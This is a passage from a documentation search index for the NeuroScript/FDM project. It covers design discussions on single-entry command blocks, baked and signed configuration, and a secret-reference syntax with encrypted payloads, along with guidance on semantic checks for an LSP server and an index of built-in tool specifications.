edge.</li> <li>[ ] Use the correct <code>ErrorCode\u2026</code> \u2013 pick Security for sandbox or ACL       violations.</li> <li>[ ] Let <code>CriticalHandler</code> own logging / shutdown; avoid duplicate logs.</li> </ul> <p>Do this and every critical failure bubbles to the central gate, ensuring consistent metrics, clean shutdown, and predictable behaviour across FDM, NeuroScript, the Gateway, and all tool-sets.</p>"},{"location":"ns/more_command_blocks/","title":"More command blocks","text":""},{"location":"ns/more_command_blocks/#updated-cheat-sheet-per-your-latest-spec","title":"Updated cheat-sheet (per your latest spec)","text":"Aspect <code>command</code> block <code>func</code> declaration <code>on event</code> handler Name Unnamed \u2013 each file may contain exactly one <code>command</code> block. Explicit identifier (<code>func add(a int, b int)\u2026</code>). Explicit identifier (<code>on event FileAdded(e FileEvt)\u2026</code>). Parameters None (for now) \u2013 executes with zero explicit inputs. Arbitrary arg/return lists. Args mirror the emitted event\u2019s payload. Return values None (implicit <code>void</code>). Exit status is by raised error only. Any tuple. Ignored \u2013 handler pushes follow-up events instead. Execution moment Runs immediately when the file is loaded (think \u201cmodule <code>init</code>\u201d). Runs only when another piece of NS code calls it. Runtime dispatches automatically when the matching event occurs. Mixing rules File containing a <code>command</code> block cannot contain <code>func</code>s or <code>on event</code>s. May coexist with other <code>func</code>s or handlers in the same file. May coexist with <code>func</code>s; not with a <code>command</code>. Typical use One-shot scripts: DB migration, schema dump, bootstrap seed. Library helpers, business logic. Reacting to FDM events: new message, vote closed. <p>Mental model: <code>command</code> = \u201cmodule-init entrypoint\u201d; runs instantly on load. <code>func</code> = reusable subroutine. <code>on event</code> = reactive callback.</p>"},{"location":"ns/more_command_blocks/#1-why-the-no-mixing-rule-matters","title":"1\u2003Why the \u201cno mixing\u201d rule matters","text":"<ul> <li>Predictability: Loading a file cannot also define callables that lurk until later \u2013 everything it might do happens up-front.</li> <li>Static analysers: They can enforce \u201cexactly one executable root\u201d vs \u201cpure library\u201d vs \u201cpure event sink\u201d just by file tag, reducing attack surface.</li> <li>Security review: Auditors scan a file and instantly know whether anything runs on load.</li> </ul>"},{"location":"ns/more_command_blocks/#2-static-analysis-hooks-youll-want-in-the-short-term","title":"2\u2003Static-analysis hooks you\u2019ll want in the short term","text":"Pass What to flag Outcome File role check - <code>command</code> file contains other decls- non-<code>command</code> files contain top-level statements Error \u2013 reject blob Auto-exec risk Any call to <code>tool.spawn</code>, <code>net.open</code> inside a <code>command</code> without explicit <code>allow</code> tag Warning \u2013 needs human approval Dead code Unreferenced <code>func</code>s in non-command file Warn \u2013 trim bloat <p>Implement these as the first three passes in your AST analyser (see previous answer\u2019s skeleton).</p>"},{"location":"ns/more_command_blocks/#3-how-the-api-package-should-expose-this-to-fdm","title":"3\u2003How the API package should expose this to FDM","text":"<pre><code>// api/runmode.go\n\n// RunMode tells the host what kind of artefact this AST blob is.\ntype RunMode uint8\n\nconst (\n    RunModeLibrary RunMode = iota // only funcs / types\n    RunModeCommand                // auto-exec block\n    RunModeEventSink              // only on-event handlers\n)\n\n// DetectRunMode walks the root and decides mode.\nfunc DetectRunMode(tree *ast.Tree) RunMode { \u2026 }\n</code></pre> <pre><code>// api/loader.go\n\nfunc LoadAndMaybeExec(ctx context.Context, blob *SignedAST) error {\n    tree, err := VerifyAndDecode(blob)\n    if err != nil { return err }\n\n    switch DetectRunMode(tree) {\n    case RunModeCommand:\n        return runCommandBlock(ctx, tree)\n    case RunModeLibrary, RunModeEventSink:\n        return nil // just cached for later use\n    }\n    return nil\n}\n</code></pre> <p>FDM simply calls <code>LoadAndMaybeExec</code> after signature-check; only <code>RunModeCommand</code> produces side-effects immediately.</p>"},{"location":"ns/more_command_blocks/#4-future-proofing-adding-parameters-to-command","title":"4\u2003Future-proofing: adding parameters to <code>command</code>","text":"<p>When you\u2019re ready to let <code>command</code> accept arguments:</p> <pre><code>command(args\u2026){\n    \u2026\n}\n</code></pre> <ol> <li>Still unnamed \u2013 file remains single-entry.</li> <li>Invocation path: FDM passes CLI/RPC arguments into the loader, which in turn calls <code>command</code> with those values.</li> <li>Static tooling: Update the \u201cfile role check\u201d to record the arg signature and validate call-site arity.</li> </ol> <p>Until then, the zero-arg rule keeps life simple.</p>"},{"location":"ns/more_command_blocks/#5-what-to-add-to-the-docs","title":"5\u2003What to add to the docs","text":"<p>A file is in exactly one of three roles:</p> <ol> <li>Command script \u2013 contains a single unnamed <code>command{}</code> that executes on load.</li> <li>Library \u2013 contains one or more <code>func</code> declarations and nothing else.</li> <li>Event sink \u2013 contains one or more <code>on event</code> handlers and nothing else.</li> </ol> <p>Drop that paragraph into <code>docs/language.md</code> and the ambiguity disappears.</p> <p>All clear? If you need code snippets for the analyser passes or a sample <code>command</code> runner implementation, just say the word.</p> <p>AJP: Thinking about it, we can forget command block params -- the source system simply writes them into the code with set statements. It is not kept or re-used, so, apart for perhaps a transparent cache, its run-once.</p> <p>O3:</p> <p>Got it \u2014 if the caller just splices concrete <code>set</code> statements into the file before shipping it, there\u2019s no need for a parameter mechanism at all. Below is a checklist of what that choice changes (and what it doesn\u2019t) so you can update the API and analyser plans without surprises.</p>"},{"location":"ns/more_command_blocks/#1-what-stays-exactly-the-same","title":"1\u2002What stays exactly the same","text":"Area Status Single unnamed <code>command{ \u2026 }</code> per file Still the only executable root; file remains self-contained. No mixing rule Command files must only contain that one block. Immediate execution on load Loader behaviour unchanged. Canonical + signed AST Works fine; the injected <code>set</code> nodes are just part of the tree that gets hashed and signed."},{"location":"ns/more_command_blocks/#2-what-disappears","title":"2\u2002What disappears","text":"<ul> <li>DetectRunMode arg-reflection \u2013 you no longer need to store or validate a command-signature record.</li> <li>Host-side arg marshalling \u2013 FDM/Gateway can drop the \u201cpass args\u201d channel; it now just rewrites the script and ships the blob.</li> </ul>"},{"location":"ns/more_command_blocks/#3-new-considerations","title":"3\u2002New considerations","text":""},{"location":"ns/more_command_blocks/#31-determinism-caching","title":"3.1\u2002Determinism &amp; caching","text":"<ul> <li>Each distinct argument set \u21d2 distinct AST hash.   That\u2019s good: your content-addressed store will naturally dedupe identical runs and keep audit trails.</li> <li>Transparent cache   If the same \u201cparam-baked\u201d blob arrives a second time, <code>LoadAndMaybeExec</code> can notice it has already run and skip execution (or run only if you attach a <code>--force</code> flag).</li> </ul>"},{"location":"ns/more_command_blocks/#32-security-policy","title":"3.2\u2002Security / policy","text":"<ul> <li>Whitelist the <code>set</code> targets.   A quick static pass can verify that only variables in a <code>@config</code> section are mutated before command execution \u2014 no silent privilege escalation.</li> <li>Time-bomb check   Reject scripts that re-set those variables inside the command block: it would defeat the \u201cfixed once\u201d guarantee.</li> </ul>"},{"location":"ns/more_command_blocks/#33-tooling-path","title":"3.3\u2002Tooling path","text":"<pre><code>flowchart RL\n    subgraph Host (FDM job runner)\n        S[template.ns] -- inject args --&gt; T[temp_with_set.ns]\n        T -- lex/parse --&gt; A[AST]\n        A -- sign &amp; store --&gt; B[SignedAST]\n    end\n    B --&gt;|Load| C[Interpreter] --&gt; result\n</code></pre> <p>The template itself never executes; only the baked version with explicit <code>set</code>.</p>"},{"location":"ns/more_command_blocks/#4-minimal-code-pattern","title":"4\u2002Minimal code pattern","text":"<pre><code>// template.ns\nset db_url = \"{{DB_URL}}\"      // place-holders\nset migrate_dir = \"{{DIR}}\"\n\ncommand {\n    must connect(db_url)\n    migrate_up(migrate_dir)\n    log(\"migration complete\")\n}\n</code></pre> <p>Host-side replace:</p> <pre><code>tmpl := os.ReadFile(\"template.ns\")\nfilled := strings.NewReplacer(\n    \"{{DB_URL}}\", cfg.DBURL,\n    \"{{DIR}}\",    cfg.Dir,\n).Replace(string(tmpl))\nblob, sum := ns.Canonicalise(filled)\nsig      := Sign(blob, gwPrivate)\n</code></pre> <p>No parameters, no cycle.</p>"},{"location":"ns/more_command_blocks/#5-static-analysis-tweaks","title":"5\u2002Static-analysis tweaks","text":"<ol> <li>Pass: <code>command.set-only-before-block</code> Error if any <code>set</code> appears after the <code>command{}</code> opens.</li> <li>Pass: <code>set-whitelist</code>    Warn or error if the variable isn\u2019t declared in a top-level <code>@config</code> section (or however you mark them).</li> <li>Pass: <code>command-purity</code> (unchanged)    Ensure the body doesn\u2019t block for &gt; N ms or call disallowed tools.</li> </ol> <p>Add them to the existing pass registry; \\~30 LOC each.</p>"},{"location":"ns/more_command_blocks/#bottom-line","title":"Bottom line","text":"<p>You\u2019ve traded interface simplicity for \u201ccompile the config right into the script,\u201d which plays nicely with your content-hashed, signed AST pipeline. Shoot over if you need the sample analyser code for the whitelist/time-bomb passes, or a quick Go helper that bakes the <code>set</code> statements and returns a ready-to-sign blob.</p> <p>Absolutely \u2014 \u201cbake-then-sign\u201d makes the entire runnable artefact brutally obvious to whatever node receives it. Here\u2019s why that transparency is valuable, plus a couple of caveats to watch for.</p>"},{"location":"ns/more_command_blocks/#1-why-the-receiving-system-can-trust-it-more","title":"1\u2002Why the receiving system can trust it more","text":"Benefit Why it matters Single-blob audit The AST already contains the exact <code>set</code> statements with concrete values, so static analysers and human reviewers see every input the code will use. No hidden side-channel of CLI flags or environment variables. Deterministic hash Because config is part of the tree, the root hash uniquely identifies both logic and runtime parameters. Signature = attestation that this specific combo was approved. Reproducibility &amp; cacheability Another node with the same blob can prove it\u2019s identical (hash match) and can optionally skip re-execution or use cached outputs. Policy enforcement is simpler The verifier can run rules like \u201call <code>db_url</code> values must point at *.internal`\u201d purely on the blob, without peeking at external job metadata. No surprise mutation window Once signed, the script cannot query or modify those variables later (your \u201ctime-bomb\u201d check). That kills an entire class of \u201cload-time rewrite\u201d exploits."},{"location":"ns/more_command_blocks/#2-operational-niceties-you-get-for-free","title":"2\u2002Operational niceties you get \u201cfor free\u201d","text":"<ul> <li>Immutable logging \u2013 the signed hash can be stored in FDM as a fact: \u201cWe executed blob <code>beef\u2026dead</code> at 2025-07-10 22:07.\u201d Diffing later runs is trivial.</li> <li>Content-addressed caching \u2013 if the same config ever gets rerun, the receiver sees the hash and can decide: \u201calready did that, idempotent \u2192 skip.\u201d</li> <li>Off-line review \u2013 auditors can examine the blob without needing the templating engine or original config files.</li> </ul>"},{"location":"ns/more_command_blocks/#3-two-things-to-be-careful-about","title":"3\u2002Two things to be careful about","text":"Risk Mitigation Secrets disclosure \u2013 the injected <code>set db_password = \"SuperSecret\"</code> string now lives\u2014signed and immutable\u2014in your artefact store and logs. \u2022 Inject only references (e.g. <code>set db_password = secret(\"db/main\")</code>) and have the interpreter resolve those via a secrets vault.\u2022 Or encrypt the value with the receiver\u2019s public key before embedding. Template tampering before sign \u2013 whoever performs the substitution could slip malicious code into the template. \u2022 Run the substitution in a trusted, air-gapped preparer service.\u2022 Sign immediately after generation so later transit can\u2019t alter it."},{"location":"ns/more_command_blocks/#4-what-your-api-tooling-should-reflect","title":"4\u2002What your API / tooling should reflect","text":"<ol> <li>A \u201cprepare\u201d endpoint</li> </ol> <pre><code>type Preparer interface {\n    Bake(templateID string, args map[string]string) (*SignedAST, error)\n}\n</code></pre> <p>Runs on the trusted side, returns a ready-to-ship blob.</p> <ol> <li>Loader verifies &amp; optionally short-circuits</li> </ol> <pre><code>if cache.Has(blob.Sum) {\n    return cache.Result(blob.Sum) // avoid re-exec\n}\nexec.Run(blob)\n</code></pre> <ol> <li>Static pass: <code>NoSetAfterLoad</code>    Flags any assignment to those baked variables inside the command body; zero runtime mutability.</li> </ol>"},{"location":"ns/more_command_blocks/#bottom-line_1","title":"Bottom line","text":"<p>By merging \u201cconfig\u201d and \u201ccode\u201d into one immutable, signed artefact, you give downstream systems everything they need to see, validate, and reproduce exactly what will run\u2014no hidden knobs. Provided you treat secrets carefully and run the baking step in a trusted compartment, it\u2019s a very solid move.</p> <p>ajp: We would need a standardized way for command blocks to get secrets from the environment I suppose or some kind of one-way encoding perhaps (as you suggested with the rsa sigs?) But making a pre-defined standard would be a good enabling step i think :)</p> <p>o3:</p>"},{"location":"ns/more_command_blocks/#a-portable-secret-reference-standard-for-neuroscript-command-blocks","title":"A portable secret-reference standard for NeuroScript command blocks","text":"<p>(so we never hard-code secrets, yet still ship a single signed blob)</p>"},{"location":"ns/more_command_blocks/#1-syntax-secretscopekey-opts","title":"1\u2003Syntax: <code>secret(\"scope/key\" [, opts\u2026])</code>","text":"<pre><code>set db_user     = \"app\"\nset db_password = secret(\"prod/db/main\", enc=\"age\")\n</code></pre> <ul> <li>Always a compile-time literal (not a call):   the canonicaliser records it as a SecretRef node, not as a string value.</li> <li><code>scope/key</code>: flat namespace you map to your vault; keep it boring (<code>prod/db/main</code>).</li> <li><code>opts</code> (optional)</li> </ul> key allowed values meaning <code>enc</code> <code>\"none\"</code> (default) | <code>\"age\"</code> | <code>\"sealedbox\"</code> How the preparer packages the payload <code>vers</code> <code>\"latest\"</code> | explicit id Pin to a version so the blob stays reproducible"},{"location":"ns/more_command_blocks/#2-roles-flow","title":"2\u2003Roles &amp; flow","text":"<pre><code>sequenceDiagram\n    Participant Dev\n    Participant Preparer    as Trusted&amp;nbsp;Preparer\n    Participant Vault       as Secrets&amp;nbsp;Vault\n    Participant Gateway     as FDM&amp;nbsp;Gateway\n    Participant Runner      as Interpreter/Runner\n\n    Dev-&gt;&gt;Preparer: template.ns + cfg.json\n    Preparer-&gt;&gt;Vault: get(\"prod/db/main\")\n    Vault--&gt;&gt;Preparer: \"S3cr3t!\"\n    Preparer-&gt;&gt;Preparer: package \u2192 SecretBlob\n    Preparer-&gt;&gt;Gateway: SignedAST (secret ref \u2192 encrypted payload)\n    Gateway--&gt;&gt;Runner: deliver blob\n    Runner-&gt;&gt;Runner: decrypt &amp; inject\\n(set db_password)\n    Runner-&gt;&gt;Runner: execute command{}\n</code></pre>"},{"location":"ns/more_command_blocks/#3-packaging-formats","title":"3\u2003Packaging formats","text":"<code>enc</code> opt What the preparer stores in the AST Runner\u2019s job When to use <code>none</code> Base64 plaintext (still inside signed blob) Just decode Non-sensitive config (feature flags) <code>age</code> age encrypted blob using Runner\u2019s public key Decrypt with its private key Secrets at host security level, simple key distro <code>sealedbox</code> libsodium sealed box with Runner\u2019s Curve25519 pk Decrypt You already use libsodium elsewhere <p>All flavours hash the ciphertext, so the signed root stays stable.</p>"},{"location":"ns/more_command_blocks/#4-interpreter-contract","title":"4\u2003Interpreter contract","text":"<ol> <li> <p>During load, walk the tree:</p> </li> <li> <p>If node = <code>SecretRef{enc:\"none\"}</code>, replace with literal.</p> </li> <li>If <code>enc:\"age\"| \"sealedbox\"</code>, call <code>secret.decode(blob)</code>.</li> <li>If decoding fails \u2192 raise <code>ErrorCodeSecretDecryption</code> (new code 99909?).</li> <li>Keep no plaintext after command completes unless caller flagged <code>cache_secret=true</code>.</li> </ol>"},{"location":"ns/more_command_blocks/#5-static-analysis-passes-to-add-now","title":"5\u2003Static-analysis passes to add now","text":"Pass Reject when\u2026 <code>secret-outside-command</code> SecretRef found in library file. (We don\u2019t want long-lived funcs to hide secrets.) <code>secret-without-enc</code> <code>enc=\"none\"</code> but key path matches regex `(?i)(password token secret)` <code>secret-unknown-opts</code> Any opt key \u2260 enc/vers <p>30-40 LOC each; no crypto needed.</p>"},{"location":"ns/more_command_blocks/#6-go-helper-snippets","title":"6\u2003Go helper snippets","text":"<pre><code>// api/secret/package.go\ntype SecretRef struct {\n    Path string            // \"prod/db/main\"\n    Enc  string            // \"none\" / \"age\" / \"sealedbox\"\n    Raw  []byte            // ciphertext or plain\n}\n\nfunc Decode(ref SecretRef, privKey []byte) (string, error) {\n    switch ref.Enc {\n    case \"none\":\n        return string(ref.Raw), nil\n    case \"age\":\n        return age.Decrypt(ref.Raw, privKey)\n    case \"sealedbox\":\n        return box.OpenAnonymous(nil, ref.Raw, &amp;privKey32, &amp;key32)\n    default:\n        return \"\", fmt.Errorf(\"unknown enc %q\", ref.Enc)\n    }\n}\n</code></pre> <p><code>Canonicaliser</code> sees <code>secret(\"\u2026\")</code> \u2192 emits <code>*ast.SecretRef</code> \u2234 still deterministic.</p>"},{"location":"ns/more_command_blocks/#7-operational-policy-stub","title":"7\u2003Operational policy stub","text":"<pre><code># fdm/policy/secret.yml\nallowed_encodings:\n  - age\n  - sealedbox\nmax_secret_size: 8KiB\nforbid_scopes:\n  - \"dev/*\"\n</code></pre> <p>Loader consults this before accepting a blob.</p>"},{"location":"ns/more_command_blocks/#8-migration-path","title":"8\u2003Migration path","text":"Stage What to implement 0 (today) Accept <code>enc=\"none\"</code> only; secrets stay plaintext but signed. 1 Add <code>age</code> packaging in Preparer + decode in Runner. 2 Wire vault pull + policy checks, add analyser passes. 3 Flip policy to forbid <code>enc=\"none\"</code> for sensitive keys."},{"location":"ns/more_command_blocks/#bottom-line_2","title":"Bottom line","text":"<p>The <code>secret(\"scope/key\", enc=\u2026)</code> literal gives you</p> <ul> <li>signed, deterministic blobs,</li> <li>zero runtime CLI/env leakage,</li> <li>and a clear hook for stronger crypto later.</li> </ul> <p>Start with plaintext to validate the flow, then bolt on <code>age</code> without touching any command-block source.</p>"},{"location":"ns/semantic_lsp_disc/","title":"Semantic lsp disc","text":"<p>To add semantic error checking (beyond what the grammar captures) to your LSP support for VSCode and Vim, you need to extend your current setup in the following structured way:</p>"},{"location":"ns/semantic_lsp_disc/#semantic-errors-vs-grammar-errors","title":"\ud83e\udde0 Semantic Errors vs. Grammar Errors","text":"<ul> <li>Grammar errors: Syntax-level, handled by ANTLR + LSP grammar definitions.</li> <li>Semantic errors: Logical/structural issues in a syntactically valid program (e.g., undefined variables, type mismatches, misuse of functions).</li> </ul> <p>You now need an analyzer layer that:</p> <ol> <li>Consumes the AST (produced from parsing)</li> <li>Runs semantic checks</li> <li>Reports diagnostics back to the editor via the LSP</li> </ol>"},{"location":"ns/semantic_lsp_disc/#strategy-overview","title":"\u2705 Strategy Overview","text":""},{"location":"ns/semantic_lsp_disc/#1-build-a-semantic-analyzer","title":"1. Build a Semantic Analyzer","text":"<p>Use your existing AST (likely Go structs from ANTLR's parse) and traverse it.</p> <p>For example:</p> <ul> <li>Undefined variables</li> <li>Calling non-functions</li> <li>Type mismatches</li> <li>Invalid event handlers or tools</li> <li>Violations of <code>final</code>/<code>nooverride</code> semantics</li> </ul> <p>You'll define:</p> <pre><code>type SemanticAnalyzer struct {\n    diagnostics []lsp.Diagnostic\n    symbolTable SymbolTable\n    // possibly more: scope stack, current file, etc.\n}\n</code></pre> <p>Then walk the AST with visitors or a manual traversal, accumulating diagnostics:</p> <pre><code>func (s *SemanticAnalyzer) VisitFunctionCall(node *ast.FuncCall) {\n    if !s.symbolTable.IsDefined(node.Name) {\n        s.diagnostics = append(s.diagnostics, makeDiagnostic(node.Pos, \"Function not defined\"))\n    }\n}\n</code></pre> <p>You already have most of this logic in the interpreter or runtime \u2014 extract and reuse where possible.</p>"},{"location":"ns/semantic_lsp_disc/#2-expose-semantic-analyzer-to-the-lsp-server","title":"2. Expose Semantic Analyzer to the LSP Server","text":"<p>Your LSP server (likely using <code>golang.org/x/tools/gopls</code>-style wiring or <code>lsp-protocol</code>) should now do the following in <code>textDocument/didOpen</code> or <code>textDocument/didChange</code>:</p> <pre><code>func (s *Server) onDidOpen(params lsp.DidOpenTextDocumentParams) {\n    parseTree := parser.Parse(params.Text)\n    ast := builder.BuildAST(parseTree)\n\n    analyzer := semantic.NewAnalyzer()\n    diagnostics := analyzer.Analyze(ast)\n\n    s.conn.PublishDiagnostics(params.TextDocument.URI, diagnostics)\n}\n</code></pre> <p>You report these using the LSP Diagnostic type:</p> <pre><code>lsp.Diagnostic{\n    Range:    lsp.Range{Start: ..., End: ...},\n    Severity: lsp.SeverityError,\n    Message:  \"Function not defined\",\n}\n</code></pre>"},{"location":"ns/semantic_lsp_disc/#3-connect-to-vscode-and-vim","title":"3. Connect to VSCode and Vim","text":"<p>You already have the grammar hooked up, so:</p> <ul> <li>VSCode: In your extension, make sure the LSP client can receive diagnostics. Usually handled via the language server client setup.</li> <li>Vim/Neovim: <code>coc.nvim</code>, <code>nvim-lspconfig</code>, or similar can display these diagnostics in-line.</li> </ul>"},{"location":"ns/semantic_lsp_disc/#helpful-infrastructure","title":"\ud83d\udee0 Helpful Infrastructure","text":"<ul> <li>Symbol Table with Scopes: For resolving vars, types, tools</li> <li>Type system: Leverage your <code>TypeOf()</code> work</li> <li>Error reporting utilities: Map AST positions to line/column spans</li> <li>Test harness: Validate semantic checks with in-memory scripts</li> </ul>"},{"location":"ns/semantic_lsp_disc/#example-errors-you-might-flag","title":"Example Errors You Might Flag","text":"Error Type Example Message Undefined var <code>x = y + 1</code> <code>Variable 'y' not defined</code> Type mismatch <code>x = \"hello\" + 5</code> <code>Cannot add string and number</code> Tool misuse <code>tool(\"unknown\")</code> <code>Tool 'unknown' not found</code> Function misuse <code>main = 5; main()</code> <code>Cannot call non-function 'main'</code> <code>final</code> redefinition second <code>func main()</code> <code>Function 'main' is final and cannot be overridden</code>"},{"location":"ns/semantic_lsp_disc/#optional-bonus-inlay-hints-code-actions","title":"\ud83d\udce6 Optional Bonus: Inlay Hints &amp; Code Actions","text":"<p>Once semantic diagnostics work:</p> <ul> <li>Inlay hints: Show types of vars or function results</li> <li>Code actions: Suggest fixes (e.g., \"Declare variable \u2018x\u2019\")</li> </ul> <p>Would you like a working <code>SemanticAnalyzer</code> Go skeleton to get started?</p> <p>This is a deep and important question. You're asking how to:</p> <ol> <li>Extract the semantic rules implicit in your interpreter/runtime.</li> <li>Codify them into explicit form, ideally decoupled from the interpreter.</li> <li>Keep them up to date as the language evolves.</li> </ol> <p>Here\u2019s a rigorous way to approach it:</p>"},{"location":"ns/semantic_lsp_disc/#1-extracting-semantic-rules-from-source","title":"\ud83e\uddf1 1. Extracting Semantic Rules from Source","text":""},{"location":"ns/semantic_lsp_disc/#a-trace-existing-behavior","title":"A. Trace Existing Behavior","text":"<p>Start by reading/interpreting the implicit rules in your runtime/interpreter:</p> <ul> <li>When do you raise runtime errors?</li> <li>What assumptions do your function calls, tool dispatchers, etc. make?</li> <li>Where do you panic or return <code>ErrInvalid</code>?</li> </ul>"},{"location":"ns/semantic_lsp_disc/#b-catalog-rules","title":"B. Catalog Rules","text":"<p>Build a table of semantic rules as you find them, e.g.:</p> Rule ID Description Context <code>SR001</code> Variables must be declared before use Expression evaluation <code>SR002</code> Tool names must resolve to a known tool impl Tool call <code>SR003</code> Functions must not be redefined if marked <code>final</code> Function declaration <p>You may already have this half-implied in your interpreter's behavior \u2014 now it's about pulling those rules into explicit form.</p>"},{"location":"ns/semantic_lsp_disc/#2-codifying-rules-into-an-independent-layer","title":"\ud83d\udcd0 2. Codifying Rules into an Independent Layer","text":"<p>Move toward a rule-driven semantic analyzer, i.e. a separate phase that consumes AST and applies declarative checks.</p> <p>Two main strategies:</p>"},{"location":"ns/semantic_lsp_disc/#a-visitor-rule-registry","title":"A. Visitor + Rule Registry","text":"<p>Each rule is a function with a defined scope:</p> <pre><code>type Rule struct {\n    ID       string\n    Name     string\n    AppliesTo func(ast.Node) bool\n    Check    func(node ast.Node, ctx *AnalysisContext) []Diagnostic\n}\n</code></pre> <p>You iterate over AST nodes, dispatch to all rules where <code>AppliesTo(node)</code> returns true.</p> <p>This makes adding new rules composable and testable.</p>"},{"location":"ns/semantic_lsp_disc/#b-rule-dsl-or-metadata","title":"B. Rule DSL or Metadata","text":"<p>Optionally, define rule specs in a separate format (e.g. YAML or JSON) and load them:</p> <pre><code>- id: SR002\n  applies_to: ToolCall\n  message: \"Tool '{name}' not found\"\n  condition: \"!ctx.IsKnownTool(node.name)\"\n</code></pre> <p>This is more abstract, but harder to maintain without a mini-language or codegen tool. Might be overkill for NS/FDM.</p>"},{"location":"ns/semantic_lsp_disc/#3-keeping-rules-up-to-date","title":"\ud83d\udd01 3. Keeping Rules Up-to-Date","text":"<p>This is where rigor pays off.</p>"},{"location":"ns/semantic_lsp_disc/#a-bind-rules-to-tests","title":"A. Bind Rules to Tests","text":"<p>Every semantic rule should be validated via a unit test or integration test that breaks the rule:</p> <ul> <li>Test scripts can live in <code>semantic_tests/</code></li> <li>Each test declares which rule(s) it should trigger</li> <li>Test framework asserts expected diagnostics</li> </ul>"},{"location":"ns/semantic_lsp_disc/#b-link-rules-to-interpreter-commits","title":"B. Link Rules to Interpreter Commits","text":"<p>Tag interpreter changes with references to affected semantic rules:</p> <pre><code>// Interpreter: updated to support byte literals\n// Affects: SR027, SR033\n</code></pre> <p>You can even generate a rule coverage report: \"Which rules are exercised by tests? Which are untested?\"</p>"},{"location":"ns/semantic_lsp_disc/#c-mirror-from-spec-if-available","title":"C. Mirror from Spec if Available","text":"<p>If you maintain a language spec (like <code>ns_script_spec.md</code>), you can:</p> <ul> <li>Cross-link rule IDs to spec sections</li> <li>Auto-lint: warn if spec describes a rule not enforced in code</li> </ul>"},{"location":"ns/semantic_lsp_disc/#tooling-helpers","title":"\ud83d\udee0 Tooling Helpers","text":"Tool Use <code>grep</code>/<code>go list</code> Find all <code>error</code> returns or <code>panic</code> calls to locate semantic assumptions Static analysis Use <code>go vet</code> or custom analyzers to find unhandled conditions Doc generators Auto-generate a semantic rule doc from Go code comments"},{"location":"ns/semantic_lsp_disc/#bottom-line","title":"\ud83e\udde0 Bottom Line","text":"<p>Semantic rules are an informal spec made formal.</p> <p>By codifying them in a rule layer separate from execution, you gain:</p> <ul> <li>Better editor integration</li> <li>Easier testing and enforcement</li> <li>Faster evolution tracking</li> </ul> <p>If you'd like a starter template for rule definition in Go, or a test harness structure for semantic cases, I can provide one.</p>"},{"location":"ns/tools/","title":"Index","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.5 :: id: tool-spec-index-v0.1.5 :: status: draft :: dependsOn: ./*.md :: howToUpdate: Update the list below when tool specification documents are added, removed, or renamed in this directory.  </p>"},{"location":"ns/tools/#neuroscript-tool-specifications-index","title":"NeuroScript Tool Specifications Index","text":"<p>This directory contains detailed specifications for the built-in functions (grouped by category like <code>FS</code>, <code>git</code>, <code>String</code>, etc.) available within the NeuroScript language. Each specification follows a standard format to ensure clarity and consistency.</p>"},{"location":"ns/tools/#specification-format","title":"Specification Format","text":"<ul> <li>Tool Specification Structure Template: Defines the standard structure used for all tool specification documents in this directory.</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-core-tools","title":"Available Tool Specifications (Core Tools)","text":""},{"location":"ns/tools/#filesystem-tools-fs","title":"Filesystem Tools (<code>FS.*</code>)","text":"<ul> <li>FS.ReadFile: Reads the entire content of a specific file.</li> <li>FS.WriteFile: Writes content to a specific file, overwriting if exists.</li> <li>FS.ListDirectory: Lists the contents (files and subdirectories) of a directory.</li> <li>FS.Mkdir: Creates a new directory (including any necessary parents).</li> <li>FS.LineCountFile: Counts lines in a specified file.</li> <li>FS.SanitizeFilename: Cleans a string for use as a filename.</li> <li>FS.WalkDir: Recursively walks a directory tree, listing files/subdirs found.</li> <li>FS.FileHash: Calculates the SHA256 hash of a file.</li> <li>FS.MoveFile: Moves or renames a file or directory. (Previously <code>TOOL.MoveFile</code>)</li> <li>FS.DeleteFile: Deletes a file or an empty directory.</li> </ul>"},{"location":"ns/tools/#vector-tools-vector","title":"Vector Tools (<code>Vector.*</code>)","text":"<ul> <li>Vector.SearchSkills: Searches the (mock) vector index for skills matching a query.</li> <li>Vector.VectorUpdate: Updates the (mock) vector index for a given file.</li> </ul>"},{"location":"ns/tools/#git-tools-git","title":"Git Tools (<code>git.*</code>)","text":"<ul> <li>git.Add: Stages changes for commit (<code>git add</code>).</li> <li>git.Commit: Commits staged changes (<code>git commit -m</code>).</li> <li>git.NewBranch: Creates and checks out a new branch (<code>git checkout -b</code>).</li> <li>git.Checkout: Checks out an existing branch or commit (<code>git checkout</code>).</li> <li>git.Rm: Removes a file from the Git index (<code>git rm</code>).</li> <li>git.Merge: Merges a branch into the current branch (<code>git merge</code>).</li> <li>git.Status: Gets the current Git repository status. (Previously <code>TOOL.GitStatus</code>)</li> <li>git.Pull: Fetches and integrates changes from a remote repository (<code>git pull</code>). (Previously <code>TOOL.GitPull</code>)</li> <li>git.Push: Pushes local commits to a remote repository (<code>git push</code>). (Previously <code>TOOL.GitPush</code>)</li> <li>git.Diff: Shows unstaged changes in the working directory (<code>git diff</code>). (Previously <code>TOOL.GitDiff</code>)</li> </ul>"},{"location":"ns/tools/#string-tools-string","title":"String Tools (<code>String.*</code>)","text":"<ul> <li>String Tools Summary: Overview of all string manipulation tools (<code>StringLength</code>, <code>Substring</code>, <code>ToUpper</code>, <code>ToLower</code>, <code>TrimSpace</code>, <code>SplitString</code>, <code>SplitWords</code>, <code>JoinStrings</code>, <code>ReplaceAll</code>, <code>Contains</code>, <code>HasPrefix</code>, <code>HasSuffix</code>, <code>LineCountString</code>).</li> </ul>"},{"location":"ns/tools/#shell-tools-shell","title":"Shell Tools (<code>Shell.*</code>)","text":"<ul> <li>Shell.ExecuteCommand: Executes an arbitrary external command. (Use with extreme caution!)</li> <li>(GoBuild, GoCheck, GoTest, GoFmt, GoModTidy specs needed)</li> </ul>"},{"location":"ns/tools/#math-tools-math","title":"Math Tools (<code>Math.*</code>)","text":"<ul> <li>(Add, Subtract, etc. specs needed)</li> </ul>"},{"location":"ns/tools/#metadata-tools-metadata","title":"Metadata Tools (<code>Metadata.*</code>)","text":"<ul> <li>(GetMetadata, SetMetadata specs needed)</li> </ul>"},{"location":"ns/tools/#list-tools-list","title":"List Tools (<code>List.*</code>)","text":"<ul> <li>(ListLength, GetElement, AppendToList, etc. specs needed)</li> </ul>"},{"location":"ns/tools/#go-ast-tools-goast","title":"Go AST Tools (<code>GoAST.*</code>)","text":"<ul> <li>GoAST.UpdateImportsForMovedPackage: Updates Go import paths after refactoring. (Previously <code>TOOL.GoUpdateImports...</code>)</li> <li>(GoParseFile, GoFindIdentifiers, etc. specs needed)</li> 